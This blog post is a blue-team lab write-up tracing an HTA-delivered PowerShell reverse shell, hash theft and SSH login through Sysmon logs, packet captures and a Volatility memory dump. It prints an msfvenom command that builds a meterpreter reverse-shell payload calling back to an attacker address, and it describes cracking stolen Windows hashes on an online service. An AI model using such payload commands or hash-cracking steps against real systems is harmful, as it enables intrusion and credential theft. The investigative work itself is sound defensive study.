---
title: BTLO SAM Writeup
tags:
- blueteam
image: /images/sam/info.png
---

Well hello again stranger! After I completed my previous investigation on BTLO, I may have gotten a bit addicted to them. I spent 3 weeks doing this "medium" level investigation. It was a bit hard but after some time and pressure I finally cracked it.
<!--more-->

<img src="/images/sam/info.png" width="700">

So this time we had quite a bit of information. I had to take a long time to digest it all. We have sysmon logs, network captures and memory dumps. We had all the necessary tools like cyberchef for cryptography, volatility for analyzing memory dump, terminal for grepping and moving around and wireshark for network captures. Now all we need to do is figure out the series of events that took place and what actions were performed by the said adversary.

## Start

Lets start by looking at what is provided to us so that we can perform investigation.

<img src="/images/sam/start.png" width="700">

<img src="/images/sam/readme.png">

Now let's take a look at the questions we need to answer.

<img src="/images/sam/questions.png" width="700">

Starting from the top. I tried looking around for any suspicious activity inside the sysmon logs, pcap files and memory dump. 

Going through the memory dump I tried to find anything I could. Like the commands that were run. This one shows that DUMPit.exe was run to take the memory dump.

<img src="/images/sam/cmdscan.png">

I tried to look through wireshark but there was way too much data to look through without any form of idea where to look.

<img src="/images/sam/manylogswireshark.png" width="700">

While going through the PCAP file I decided to export the objects from the HTTP protocol and I found an enumeration script.

<img src="/images/sam/jawsenum.png" width="700">

Along with it, I also got a possible IP address. After that I decided to go on a hunt for activity from this IP. While going though the sysmon logs I finally found the reverse shell activity.

<img src="/images/sam/sysmonreverseshell.png" width="700">

Next we need to find the malware that initiated this reverse shell. We can see that the process ID of reverse shell is 5056. So we just need to find its parent process ID so that we can get the file that spawned that process. 

<img src="/images/sam/payload.png" width="700">

Doing a pstree I finally found the related events.

`$ volatility --profile Win7SP1x86 -f WINADMIN.raw pstree`

<img src="/images/sam/pstree.png">

So now we search for the process ID 3888. Also we have found the powershell payload along the way.

<img src="/images/sam/parentprocess.png" width="700">

Now the scenario is starting to become clearer. The user downloaded a malicious file and made the mistake of opening it. A double click was all it took to run the malicious ".hta" file and spawn a powershell to run further commands and give the attacker a reverse shell. Now we have the malicious file too. 

We can see that the user opened the malware using explorer.

<img src="/images/sam/explorer.png">

".hta" files are automatically run using the "mshta.exe" program. It is very convenient for attackers as mshta.exe is a binary that is signed by microsoft hence reducing suspicion. 

To find how this payload was generated we can do a quick google search if we don't have much idea about msf-venom. In this case the flag "hta-psh" was used to create a malicious hta file that will spawn powershell. We can guess what the command for msf-venom would look like:

`msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.0.5 lport=80 -f hta-psh > sample_template.hta`

I also tried the "malfind" command of volatility but it was giving a lot of false positives.
Moving on we can answer the next question by either reading the fully decrypted payload or doing a quick google search again.

TO extract the payload I did some bash-fu and then decrypted it using Cyberchef. 
 
<img src="/images/sam/extractPayload.png" width="700">

<img src="/images/sam/decodedpayload.png" width="700">

or you can read how processes can be defined so that they don't use the system shell [From here](https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo?view=net-5.0).

And for the compression stream used we can again refer to the decoded payload and look for a stream name. Now we need to give the number of hashes that were stolen form victim. I could have tried to find the SAM files in wireshark but I took the lazy way out and just listed all the hashes using volatility.

<img src="/images/sam/hashes.png" width="700">

Now we need to crack the hash for user SAM and Admin. Again I could have used cyberchef but there are better ways to crack hashes available online. I used [hashes.com](https://hashes.com/en/decrypt/hash). 

Let's also talk about format of hashes in windows. If a hash look like:

`Guest:501:bak1xdb8187d1xhdw:gjc03v9cug538xdhn2222:::`

First part is the username, second is user ID, third is the LM hash and final part is the NTLM hash. All of them are separated using a ":" character. We can try and crack either the LM or NTLM. LM is preferred because it is weaker than NTLM. Then why is it stored? Well according to the internet it is stored due to backward compatibility reasons.

Finally we need to find what the adversary did using the passwords. I already knew the IP so I again looked for it in the sysmon logs.

<img src="/images/sam/ssh.png" width="700">

or we can look inside the PCAP file or the memory dump.

<img src="/images/sam/established.png">

So the adversary just logged into the victim machine using SSH in the end. For the final question we need to give the name of any other scripts that were run. We already found out the name for this script in the beginning. 

The sysmon logs were a great help in figuring out what went down in the victim machine.

This was a really fun Investigation. 
I have tried not to give straight up answers because that is no fun. 
It took me about 3-4 weeks of distributed time to get this done. 
I will see you in the next one!
